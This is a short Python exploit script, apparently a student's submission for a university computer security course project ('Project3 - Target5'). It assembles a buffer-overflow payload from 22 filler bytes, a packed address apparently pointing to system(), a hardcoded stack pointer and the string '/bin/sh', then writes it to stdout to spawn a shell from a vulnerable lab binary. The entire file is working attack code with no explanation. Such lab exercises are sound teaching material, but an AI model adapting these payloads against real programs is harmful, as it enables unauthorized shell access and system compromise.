#!/usr/bin/env python3

#Author: Tanner Bonds
#Date: 10/30/2020
#Dr. Drew Springall - COMP6370
#Project3 - Target5

import struct
import sys

buffer = (b"a" * 22)
system = struct.pack("<I", 0x08049b72)

bytes = b"/bin/sh"
shellcode = struct.pack("7s", bytes)
shellcode_addr = struct.pack("<I", 0xbffea220 + 0x4)

payload = buffer + system + shellcode_addr + shellcode 
sys.stdout.buffer.write(payload)
